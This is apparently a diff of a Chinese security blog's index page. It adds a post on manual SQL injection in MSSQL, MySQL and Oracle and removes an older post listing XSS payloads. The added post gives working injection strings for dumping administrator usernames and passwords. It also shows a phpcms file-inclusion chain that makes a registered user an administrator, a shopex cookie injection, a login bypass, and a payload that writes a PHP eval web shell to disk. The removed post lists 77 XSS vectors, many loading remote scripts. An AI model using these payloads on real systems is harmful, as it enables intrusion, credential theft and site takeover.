@@ -65,6 +65,45 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-手工注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/04/18/手工注入/" class="article-date">
+  <time datetime="2016-04-18T07:46:29.000Z" itemprop="datePublished">2016-04-18</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/04/18/手工注入/">MSSQL、MySQL、Oracle 手工注入</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="SqlServer_uFF1A"><a href="#SqlServer_uFF1A" class="headerlink" title="SqlServer："></a>SqlServer：</h3><p> 漏洞：前端漏洞(常规方法检测，有错误回显)，传递 get 参数的时候没有过滤，直接连接到 SQL 语句上。<br> ····<br>    1.判断注入点方法：加 ‘ 报错，或是加 and 1=1 返回正常，加 and 1=2 返回错误，aspx 一般都是 SqlServer。<br>    2.判断数据库版本：加 and 1=@@version。<br>    3.查看数据库其他信息：查看服务器所在主机名称：and 1=host_name() ，查看当前用户：and 1=current_user 获得当前用户，设为 Current_User，<br>    查看当前数据库：and 1=db_name()，获得数据库名称，设为 DB_NAME。<br>    4.判断数据表名：and 1=(select top 1 name from DB_NAME.Current_User.sysobjects where xtype=CHAR(85) and name not in (select top N name from DB_NAME.Current_User.sysobjects where xtype=CHAR(85)))–，从 0 开始替换 N 返回表名。这个过程会得到一些有用的表，比如 XXX_admin，XXX_users==。<br>    5.对比较敏感的表进行进一步注入获得字段：and 1=(select top 1 Name from syscolumns where id=object_id(0x5700650062005F00410064006D0069006E00) and name not in(select top N Name from syscolumns where id=object_id(0x5700650062005F00410064006D0069006E00)))，从 0 开始替换 N 逐个返回列名。可能会获得一些有用的字段值，比如 username，password 等等。<br>    6.根据字段名称获得相应的字段内容：”and 1=(select top 1 [Column_Name] from XXX_admin)” 获得字段内容。XXX_admin 是获得的有用的表，Column_Name 是字段名称。<br>····</p>
+<h3 id="Mysql_uFF1A"><a href="#Mysql_uFF1A" class="headerlink" title="Mysql："></a>Mysql：</h3><p>1.漏洞：前端漏洞（常规方法检测不到，用 %ce’ 检测有错误回显），GBK 宽字符转译导致的绕过 sql 注入安全检测。<br>    ①.找到存在漏洞的 URL，常规方法看不到回显，将参数改成 %ce’ ，有回显。<br>    ②.直接构造语句爆出后台账号密码：<a href="http://url/xxx.php?act=xxx&amp;xx=%ce’" target="_blank" rel="external">http://url/xxx.php?act=xxx&amp;xx=%ce’</a> and 1=1 union select 1 and (select 1 from(select count(<em>),concat((select concat(0x5b,user_name,0x3a,password,0x5d) FROM ecs_admin_user limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) %23<br>2.漏洞：前端漏洞(无错误回显)，wap/index.php 的 action 参数存在本地文件包含漏洞，包含可执行 sql 命令文件 field_add.inc.php，而在这个文件中如果参数为 action，没有任何限制和过滤就可以包含本地一个 .inc.php 的文件。field_add.inc.php 件可以看到，$dataformat 没有初始化，$sql 也没有初始化，所以可以直接调用 sql 命令。(怎么检测有这个漏洞？)<br>    ①.注册一个普通用户，查看自己的 ID,userid = 2。<br>    ②.构造 <a href="http://URL/phpcms/wap/index.php?action=../../formguide/admin/include/fields/datetime/field_add&amp;sql=" target="_blank" rel="external">http://URL/phpcms/wap/index.php?action=../../formguide/admin/include/fields/datetime/field_add&amp;sql=</a> update phpcms_member SET groupid=1 where<br>    userid=2。更改注册账号的 groupid（组id）为 1 ，也就是将注册的 test 账号的组从普通用户组改为管理员组。<br>    ③.<a href="http://URL/phpcms/wap/index.php?action=../../formguide/admin/include/fields/datetime/field_add&amp;sql=" target="_blank" rel="external">http://URL/phpcms/wap/index.php?action=../../formguide/admin/include/fields/datetime/field_add&amp;sql=</a> update phpcms_member_cache SET groupid=1 where<br>    userid=2。更改注册账号在缓存表中的 groupid，使其不会因为缓存表未更改导致失败。<br>    ④.<a href="http://URL/phpcms/wap/index.php?action=../../formguide/admin/include/fields/datetime/field_add&amp;sql=" target="_blank" rel="external">http://URL/phpcms/wap/index.php?action=../../formguide/admin/include/fields/datetime/field_add&amp;sql=</a> insert INTO phpcms_admin<br>    (userid,username,allowmultilogin,alloweditpassword) values(2,test,1,1)。将 test 用户插入管理员表，并赋予 test 用户管理员具有的相关权限（后台登录和修改密码的权限）。<br>    ⑤.<a href="http://URL/phpcms/wap/index.php?action=../../formguide/admin/include/fields/datetime/field_add&amp;sql=" target="_blank" rel="external">http://URL/phpcms/wap/index.php?action=../../formguide/admin/include/fields/datetime/field_add&amp;sql=</a> insert INTO phpcms_admin_role (userid,roleid)<br>    values(2,1)。将 test 角色信息插入管理员角色表，使 test 角色为管理员的角色。<br>    ⑥.用test用户登录，即是管理员。<br>3.漏洞：前端漏洞（常规方法检测，有错误回显），传递 get 参数的时候没有过滤，直接拼接到 SQL 语句上。<br>    ①.常规方法检测注入点，有错误回显，可能直接返回数据库类型。<br>    ②.判断字段长度：后面加上 order by N，从数字 1 开始替代 N，直到返回错误页面，判断字段长度为错误页面的 N-1，也就是最后一个正常页面返回。<br>    ③.判断字段位置回显：加上 and 1=2 union select 1,2,3,4,5,……,N-1 最后一个数为字段长度，有回显会将相应数字显示出来。<br>    ④.判断数据库信息：加上 and 1=2 union select 1,2,sql_command,4,5,6,7,8,9,10,11,……,N-1 用 sql 指令替换 sql_command。用 version(),database(),user() 替换。<br>    ！！！注意：这里所得到的当前用户必须是 DBA 或是系统管理员，否则是进行不下去的，因为后面要用到系统表。<br>    ⑤.判断 mysql 所有数据库：加上 and 1=2 union select 1,2,group_concat(convert(SCHEMA_NAME using latin1)),4,5,6,7,8,9,10,……,N-1 from<br>    information_schema.SCHEMATA ，查看 mysql 中所有数据库的名称。<br>    ⑥.判断数据库表：加上 and 1=2 union select 1,2,group_concat(convert(table_name using latin1)),4,5,6,7,8,9,10,……,N-1 from information_schema.tables where<br>    table_schema=database()，查看当前数据库拥有的所有表。可以发现存放用户信息的表 XXX_users，XXX_admin。<br>    ⑦.判断数据表的所有列：加上 and 1=2 union select 1,2,group_concat(convert(column_name using latin1)),4,5,6,7,8,9,10,……,N-1 from information_schema.columns<br>    where table_name=0x636D735F7573657273。table_name=XXX_users，表名需要编码为 16 进制。可能会得到有用的列：userid，username，password 等等。<br>    ⑧.获取字段值：加上 and 1=2 union select 1,2,concat_ws(0x2b,userid,username,password),4,5,6,7,8,9,10,……,N-1 from cms.XXX<em>users。得到数据。<br>    ⑨.解密登陆。<br>4.漏洞：前端漏洞(有错误回显)，shopex 的 cookie 攻击漏洞。<br>    ①.判断注入点：注册账号并登陆，使用 firefox 的 cookiemanager 对 cookie 进行操作。查看 cookie，在 S[CUR] 值后面添加 ‘ 进行验证，发现页面没什么变化，再次使用<br>    ” 进行测试。从报错信息中可以获得表前缀为 sdb</em>，及 sql 语句拼接方式、数据库类型等等数据库信息。<br>    ②.判断字段数：使用” LIMIT 1,1 UNION ALL SELECT 11#<br>    ” LIMIT 1,1 UNION ALL SELECT 11，22#<br>    ” LIMIT 1,1 UNION ALL SELECT 11，22，33#<br>    ……<br>    判断当前表中的字段数，并确定页面显示的字段。从页面中可以判断出该表共有 N 个字段，并且页面显示的是第 X 个字段。（设 N=6，X=3）<br>    ③.查询系统管理员用户：在 shopex 中，管理员用户信息保存在 sdb_operators 表中，使用” LIMIT 1,1 UNION ALL SELECT 11,22,(select count(*) from<br>    sdb_operators),44,55,66# 查询管理员人数。<br>    ④.查询管理员用户名和密码：加上 ” LIMIT 1,1 UNION ALL SELECT 11,22,(select username from sdb_operators limit 0,1),44,55,66# 查询用户名。得到用户名 xxxx。<br>    ⑤.使用” LIMIT 1,1 UNION ALL SELECT 11,22,(select userpass from sdb_operators where username=’xxxx’),44,55,66# 查询管理员密码。<br>    ⑥.解密登陆。<br>5.漏洞：DISCUZ 漏洞(有错误回显)：二次注入，在进行添加回复操作的时候，未对原先存在的 message 信息进行特殊字符过滤，且该 message 直接拼接到 sql 语句中，导致特殊<br>    sql 语句的执行。<br>6.漏洞：前端漏洞(无错误回显)：登陆绕过检测，网站有多处都调用并带入 admin_name 进行查询，虽然在 POST 数据时进行了过滤（首次提交返回错误页面的原因）。但因<br>    get_admin_one 函数和 check_admin 函数没有对带入的 admin_name 进行校验或过滤，导致 sql 注入。<br>    对带入的 admin_name 进行校验或过滤，导致 sql 注入。<br>    在后台登陆界面用户名密码随便输，验证码填正确，burp 抓包：修改 POST 提交的数据，修改其中的 admin_name 值为 XXXX%d5′ or 1=1%23 ，<br>    其中 XXXX 为管理员账号，放行，第一次肯定不成功（因为在 post 数据时进行了过滤），刷新一下就能绕过直接进后台。</p>
+<h3 id="Oracle_uFF1A"><a href="#Oracle_uFF1A" class="headerlink" title="Oracle："></a>Oracle：</h3><p>漏洞：前端漏洞(有错误回显)，get 参数未过滤直接拼接到 SQL 语句：<br>    1.常规方法检测注入点，有错误回显，可能直接返回数据库类型。<br>    2.判断数据库类型：在 url 后面添加 /<em>，页面返回错误，说明不是 mysql 数据库，然后使用 ‘and (select count(</em>) from user_tables)&gt;0– 返回正常，判断该数据库为<br>    oracle 数据库，因为只有 oracle 数据库才有 user_tables 表。<br>    3.获取字段数：使用’ order by 1 — ，通过变换数值，当页面报错时，则字段数就是报错之前的数，设当’ order by N– 页面报错，说明共有 N-1 个字段，设 N=5，通过<br>    ‘ union select null,null,null,null from user_tables order by 1 desc– 返回正常页面验证字段确实为 4 个。<br>    4.判断字段类型：通过<br>    ‘ union select ‘null’,null,null,null from user_tables order by 1 desc–<br>    ‘ union select null,’null’,null,null from user_tables order by 1 desc–<br>    ‘ union select null,null,’null’,null from user_tables order by 1 desc–<br>    ……<br>    判断各字段数据类型：那个返回正确说明那个就是字符型，否则可能是整型或其他类型。(设 2.3 是字符型)。<br>    5.判断各字段在页面中的显示位置：’ union select 1,’2′,’3′,4 from user_tables order by 1 desc– 可能得到 2.3.4 在网页中的显示位置。<br>    6.获取数据库表个数：使用 ‘ and (select count(<em>) from user_tables)=N–,N 从 0 开始 ++，返回正常即有 N 个表。<br>    7.猜测数据表名：使用 ‘ and 1=2 union select 1,’2’,table_name,4 from user_tables– 获取数据表名，设获得关键表名 XXX。<br>    8.判断账号数：利用 ‘ and (select count(</em>) from XXX)&gt;0 — 判断共有多少个账号，用数字替代 0，返回非正常页面证明账号个数为填入的数字。<br>    9.判断字段个数：使用 ‘ and (SELECT count(<em>) FROM USER_TAB_COLUMNS WHERE table_name=’XXX’)&gt;0–，通过替换数字 0，当页面出现错时，此时的数字就是该表的字段个数。<br>    设得到字段个数为 A=2。<br>    10.获取字段名：使用 ‘ and 1=2 union select 1,’2′,COLUMN_NAME,4 from (select </em> from (SELECT COLUMN_NAME FROM USER_TAB_COLUMNS WHERE table_name=’XXX’ order by 1 asc ) WHERE ROWNUM&lt;=A ORDER BY 1 DESC) WHERE ROWNUM&lt;=1，通过不断变换第一个 rownum 后面的数字（A–），可以得到该表的字段名称。设为 name,password.<br>    11.获取管理员信息：利用’ and 1=2 union select 1,name,password,4 from XXX — 获取管理员用户名和密码信息<br>    注入点导出一句话：<br>    在获取到字段数之后，直接联合查询 <a href="http://www.xxx.com/news.php?NewsID=-1" target="_blank" rel="external">http://www.xxx.com/news.php?NewsID=-1</a> union select ‘&lt;?php eval($_POST[cmd]);?&gt;’,2 into outfile ‘D:/wwwroot/eval.php’<br>    然后访问 eval.php。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2016/04/18/手工注入/" data-id="cin5pv33l0003hcfwzjiytr8y" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-yewuluoji" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2016/04/18/yewuluoji/" class="article-date">
@@ -178,7 +217,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/04/18/yewuluoji/" data-id="cin5p3mj90003f8fwgx5vsyod" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/04/18/yewuluoji/" data-id="cin5pv33o0004hcfwaxdpu159" class="article-share-link">Share</a>
       
       
     </footer>
@@ -279,7 +318,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/04/18/tiquan/" data-id="cin5p3mjd0004f8fwm9s9itxg" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/04/18/tiquan/" data-id="cin5pv33s0005hcfwy5abzkqx" class="article-share-link">Share</a>
       
       
     </footer>
@@ -389,7 +428,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/03/20/移动应用渗透测试备忘单(二)/" data-id="cin5p3miz0001f8fwfesccqlh" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/03/20/移动应用渗透测试备忘单(二)/" data-id="cin5pv33a0001hcfw2wxdl0kg" class="article-share-link">Share</a>
       
       
     </footer>
@@ -533,7 +572,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/03/02/移动应用渗透测试备忘单(一)/" data-id="cin5p3mj30002f8fw21xohb6f" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/03/02/移动应用渗透测试备忘单(一)/" data-id="cin5pv33h0002hcfwepz5zrg2" class="article-share-link">Share</a>
       
       
     </footer>
@@ -766,7 +805,7 @@ wtmpx：相当于历史纪录，记录着所有登录过主机的用户，时间
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/01/05/solaris/" data-id="cin5p3mji0006f8fw5g81ukuy" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/01/05/solaris/" data-id="cin5pv3460007hcfwdgggr6ld" class="article-share-link">Share</a>
       
       
     </footer>
@@ -805,7 +844,7 @@ wtmpx：相当于历史纪录，记录着所有登录过主机的用户，时间
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/01/04/curl/" data-id="cin5p3mjp0008f8fwpkhxvonl" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/01/04/curl/" data-id="cin5pv34g0009hcfww1qs0kne" class="article-share-link">Share</a>
       
       
     </footer>
@@ -844,7 +883,7 @@ wtmpx：相当于历史纪录，记录着所有登录过主机的用户，时间
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/01/04/cmdtime/" data-id="cin5p3mjt0009f8fwvu4i4z4u" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/01/04/cmdtime/" data-id="cin5pv34j000ahcfwgrxdrr3a" class="article-share-link">Share</a>
       
       
     </footer>
@@ -1008,7 +1047,7 @@ wtmpx：相当于历史纪录，记录着所有登录过主机的用户，时间
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2015/12/31/apache/" data-id="cin5p3mjw000af8fw8rw0gr4b" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2015/12/31/apache/" data-id="cin5pv34m000bhcfw9fho4lqo" class="article-share-link">Share</a>
       
       
     </footer>
@@ -1048,295 +1087,7 @@ wtmpx：相当于历史纪录，记录着所有登录过主机的用户，时间
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2015/12/25/hello-world/" data-id="cin5p3mjl0007f8fw73og7hm6" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-XSS" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2015/12/25/XSS/" class="article-date">
-  <time datetime="2015-12-25T08:04:32.000Z" itemprop="datePublished">2015-12-25</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2015/12/25/XSS/">XSS跨站脚本攻击汇总</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <blockquote>
-<p>  XSS 全称(Cross Site Scripting) 跨站脚本攻击， 是Web程序中最常见的漏洞。指攻击者在网<br>页中嵌入客户端脚本(例如JavaScript), 当用户浏览此网页时，脚本就会在用户的浏览器上执<br>行，从而达到攻击者的目的. 比如获取用户的Cookie，导航到恶意网站,携带木马等!</p>
-</blockquote>
-<pre><code>                            XSS跨站脚本攻击汇总
-(1)普通的XSS JavaScript注入
-&lt;SCRIPT SRC=http://3w.org/XSS/xss.js&gt;&lt;/SCRIPT&gt;
-
-(2)IMG标签XSS使用JavaScript命令
-&lt;SCRIPT SRC=http://3w.org/XSS/xss.js&gt;&lt;/SCRIPT&gt;
-
-(3)IMG标签无分号无引号
-&lt;IMG SRC=javascript:alert(‘XSS’)&gt;
-
-(4)IMG标签大小写不敏感
-&lt;IMG SRC=JaVaScRiPt:alert(‘XSS’)&gt;
-
-(5)HTML编码(必须有分号)
-&lt;IMG SRC=javascript:alert(&quot;XSS&quot;)&gt;
-
-(6)修正缺陷IMG标签
-&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;
-
-(7)formCharCode标签(计算器)
-&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;
-
-(8)UTF-8的Unicode编码(计算器)
-&lt;IMG SRC=jav..省略..S&apos;)&gt;
-
-(9)7位的UTF-8的Unicode编码是没有分号的(计算器)
-&lt;IMG SRC=jav..省略..S&apos;)&gt;
-
-(10)十六进制编码也是没有分号(计算器)
-&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61..省略..&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;
-
-(11)嵌入式标签,将Javascript分开
-&lt;IMG SRC=&quot;jav ascript:alert(‘XSS’);&quot;&gt;
-
-(12)嵌入式编码标签,将Javascript分开
-&lt;IMG SRC=&quot;jav ascript:alert(‘XSS’);&quot;&gt;
-
-(13)嵌入式换行符
-&lt;IMG SRC=&quot;jav ascript:alert(‘XSS’);&quot;&gt;
-
-(14)嵌入式回车
-&lt;IMG SRC=&quot;jav ascript:alert(‘XSS’);&quot;&gt;
-
-(15)嵌入式多行注入JavaScript,这是XSS极端的例子
-&lt;IMG SRC=&quot;javascript:alert(‘XSS‘)&quot;&gt;
-
-(16)解决限制字符(要求同页面)
-&lt;script&gt;z=’document.’&lt;/script&gt;
-&lt;script&gt;z=z+’write(&quot;‘&lt;/script&gt;
-&lt;script&gt;z=z+’&lt;script’&lt;/script&gt;
-&lt;script&gt;z=z+’ src=ht’&lt;/script&gt;
-&lt;script&gt;z=z+’tp://ww’&lt;/script&gt;
-&lt;script&gt;z=z+’w.shell’&lt;/script&gt;
-&lt;script&gt;z=z+’.net/1.’&lt;/script&gt;
-&lt;script&gt;z=z+’js&gt;&lt;/sc’&lt;/script&gt;
-&lt;script&gt;z=z+’ript&gt;&quot;)’&lt;/script&gt;
-&lt;script&gt;eval_r(z)&lt;/script&gt;
-
-(17)空字符
-perl -e ‘print &quot;&lt;IMG SRC=java\0script:alert(\&quot;XSS\&quot;)&gt;&quot;;’ &gt; out
-
-(18)空字符2,空字符在国内基本没效果.因为没有地方可以利用
-perl -e ‘print &quot;&lt;SCR\0IPT&gt;alert(\&quot;XSS\&quot;)&lt;/SCR\0IPT&gt;&quot;;’ &gt; out
-
-(19)Spaces和meta前的IMG标签
-&lt;IMG SRC=&quot;   javascript:alert(‘XSS’);&quot;&gt;
-
-(20)Non-alpha-non-digit XSS
-&lt;SCRIPT/XSS SRC=&quot;http://3w.org/XSS/xss.js&quot;&gt;&lt;/SCRIPT&gt;
-
-(21)Non-alpha-non-digit XSS to 2
-&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;
-
-(22)Non-alpha-non-digit XSS to 3
-&lt;SCRIPT/SRC=&quot;http://3w.org/XSS/xss.js&quot;&gt;&lt;/SCRIPT&gt;
-
-(23)双开括号
-&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;
-
-(24)无结束脚本标记(仅火狐等浏览器)
-&lt;SCRIPT SRC=http://3w.org/XSS/xss.js?&lt;B&gt;
-
-(25)无结束脚本标记2
-&lt;SCRIPT SRC=//3w.org/XSS/xss.js&gt;
-
-(26)半开的HTML/JavaScript XSS
-&lt;IMG SRC=&quot;javascript:alert(‘XSS’)&quot;
-
-(27)双开角括号
-&lt;iframe src=http://3w.org/XSS.html &lt;
-
-(28)无单引号 双引号 分号
-&lt;SCRIPT&gt;a=/XSS/
-alert(a.source)&lt;/SCRIPT&gt;
-
-(29)换码过滤的JavaScript
-\&quot;;alert(‘XSS’);//
-
-(30)结束Title标签
-&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);&lt;/SCRIPT&gt;
-
-(31)Input Image
-&lt;INPUT SRC=&quot;javascript:alert(‘XSS’);&quot;&gt;
-
-(32)BODY Image
-&lt;BODY BACKGROUND=&quot;javascript:alert(‘XSS’)&quot;&gt;
-
-(33)BODY标签
-&lt;BODY(‘XSS’)&gt;
-
-(34)IMG Dynsrc
-&lt;IMG DYNSRC=&quot;javascript:alert(‘XSS’)&quot;&gt;
-
-(35)IMG Lowsrc
-&lt;IMG LOWSRC=&quot;javascript:alert(‘XSS’)&quot;&gt;
-
-(36)BGSOUND
-&lt;BGSOUND SRC=&quot;javascript:alert(‘XSS’);&quot;&gt;
-
-(37)STYLE sheet
-&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(‘XSS’);&quot;&gt;
-
-(38)远程样式表
-&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;http://3w.org/xss.css&quot;&gt;
-
-(39)List-style-image(列表式)
-&lt;STYLE&gt;li {list-style-image: url(&quot;javascript:alert(‘XSS’)&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS
-
-(40)IMG VBscript
-&lt;IMG SRC=’vbscript:msgbox(&quot;XSS&quot;)’&gt;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS
-
-(41)META链接url
-&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; URL=http://;URL=javascript:alert(‘XSS’);&quot;&gt;
-
-(42)Iframe
-&lt;IFRAME SRC=&quot;javascript:alert(‘XSS’);&quot;&gt;&lt;/IFRAME&gt;
-
-(43)Frame
-&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert(‘XSS’);&quot;&gt;&lt;/FRAMESET&gt;
-
-(44)Table
-&lt;TABLE BACKGROUND=&quot;javascript:alert(‘XSS’)&quot;&gt;
-
-(45)TD
-&lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript:alert(‘XSS’)&quot;&gt;
-
-(46)DIV background-image
-&lt;DIV STYLE=&quot;background-image: none)&quot;&gt;
-
-(47)DIV background-image后加上额外字符(1-32&amp;34&amp;39&amp;160&amp;8192-8&amp;13&amp;12288&amp;65279)
-&lt;DIV STYLE=&quot;background-image: none)&quot;&gt;
-
-(48)DIV expression
-&lt;DIV STYLE=&quot;width: expression_r(alert(‘XSS’));&quot;&gt;
-
-(49)STYLE属性分拆表达
-&lt;IMG STYLE=&quot;xss:expression_r(alert(‘XSS’))&quot;&gt;
-
-(50)匿名STYLE(组成:开角号和一个字母开头)
-&lt;XSS STYLE=&quot;xss:expression_r(alert(‘XSS’))&quot;&gt;
-
-(51)STYLE background-image
-&lt;STYLE&gt;.XSS{background-image:none&quot;);}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;
-
-(52)IMG STYLE方式
-exppression(alert(&quot;XSS&quot;))’&gt;
-
-(53)STYLE background
-&lt;STYLE&gt;&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:alert(‘XSS’)&quot;)}&lt;/STYLE&gt;
-
-(54)BASE
-&lt;BASE HREF=&quot;javascript:alert(‘XSS’);//&quot;&gt;
-
-(55)EMBED标签,你可以嵌入FLASH,其中包涵XSS
-&lt;EMBED SRC=&quot;http://3w.org/XSS/xss.swf&quot; &gt;&lt;/EMBED&gt;
-
-(56)在flash中使用ActionScrpt可以混进你XSS的代码
-a=&quot;get&quot;;
-b=&quot;URL(\&quot;&quot;;
-c=&quot;javascript:&quot;;
-d=&quot;alert(‘XSS’);\&quot;)&quot;;
-eval_r(a+b+c+d);
-
-(57)XML namespace.HTC文件必须和你的XSS载体在一台服务器上
-&lt;HTML xmlns:xss&gt;
-&lt;?import namespace=&quot;xss&quot; implementation=&quot;http://3w.org/XSS/xss.htc&quot;&gt;
-&lt;xss:xss&gt;XSS&lt;/xss:xss&gt;
-&lt;/HTML&gt;
-
-(58)如果过滤了你的JS你可以在图片里添加JS代码来利用
-&lt;SCRIPT SRC=&quot;&quot;&gt;&lt;/SCRIPT&gt;
-
-(59)IMG嵌入式命令,可执行任意命令
-&lt;IMG SRC=&quot;http://www.XXX.com/a.php?a=b&quot;&gt;
-
-(60)IMG嵌入式命令(a.jpg在同服务器)
-Redirect 302 /a.jpg http://www.XXX.com/admin.asp&amp;deleteuser
-
-(61)绕符号过滤
-&lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;http://3w.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
-
-(62)
-&lt;SCRIPT =&quot;&gt;&quot; SRC=&quot;http://3w.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
-
-(63)
-&lt;SCRIPT a=&quot;&gt;&quot; &quot; SRC=&quot;http://3w.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
-
-(64)
-&lt;SCRIPT &quot;a=’&gt;’&quot; SRC=&quot;http://3w.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
-
-(65)
-&lt;SCRIPT a=`&gt;` SRC=&quot;http://3w.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
-
-(66)
-&lt;SCRIPT a=&quot;&gt;’&gt;&quot; SRC=&quot;http://3w.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
-
-(67)
-&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;http://3w.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
-
-(68)URL绕行
-&lt;A HREF=&quot;http://127.0.0.1/&quot;&gt;XSS&lt;/A&gt;
-
-(69)URL编码
-&lt;A HREF=&quot;http://3w.org&quot;&gt;XSS&lt;/A&gt;
-
-(70)IP十进制
-&lt;A HREF=&quot;http://3232235521″&gt;XSS&lt;/A&gt;
-
-(71)IP十六进制
-&lt;A HREF=&quot;http://0xc0.0xa8.0×00.0×01″&gt;XSS&lt;/A&gt;
-
-(72)IP八进制
-&lt;A HREF=&quot;http://0300.0250.0000.0001″&gt;XSS&lt;/A&gt;
-
-(73)混合编码
-&lt;A HREF=&quot;h
-tt p://6 6.000146.0×7.147/&quot;&quot;&gt;XSS&lt;/A&gt;
-
-(74)节省[http:]
-&lt;A HREF=&quot;//www.google.com/&quot;&gt;XSS&lt;/A&gt;
-
-(75)节省[www]
-&lt;A HREF=&quot;http://google.com/&quot;&gt;XSS&lt;/A&gt;
-
-(76)绝对点绝对DNS
-&lt;A HREF=&quot;http://www.google.com./&quot;&gt;XSS&lt;/A&gt;
-
-(77)javascript链接
-&lt;A HREF=&quot;javascript:document.location=’http://www.google.com/’&quot;&gt;XSS&lt;/A&gt;
-</code></pre>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2015/12/25/XSS/" data-id="cin5p3mie0000f8fw7ihhws5y" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2015/12/25/hello-world/" data-id="cin5pv34c0008hcfw7sixq74s" class="article-share-link">Share</a>
       
       
     </footer>
@@ -1365,7 +1116,7 @@ tt p://6 6.000146.0×7.147/&quot;&quot;&gt;XSS&lt;/A&gt;
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">January 2016</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">December 2015</a><span class="archive-list-count">4</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">January 2016</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">December 2015</a><span class="archive-list-count">4</span></li></ul>
     </div>
   </div>
 
@@ -1375,6 +1126,10 @@ tt p://6 6.000146.0×7.147/&quot;&quot;&gt;XSS&lt;/A&gt;
     <h3 class="widget-title">Recents</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2016/04/18/手工注入/">MSSQL、MySQL、Oracle 手工注入</a>
+          </li>
         
           <li>
             <a href="/2016/04/18/yewuluoji/">渗透项目常见漏洞</a>
@@ -1390,10 +1145,6 @@ tt p://6 6.000146.0×7.147/&quot;&quot;&gt;XSS&lt;/A&gt;
         
           <li>
             <a href="/2016/03/02/移动应用渗透测试备忘单(一)/">移动应用渗透测试备忘单(一)</a>
-          </li>
-        
-          <li>
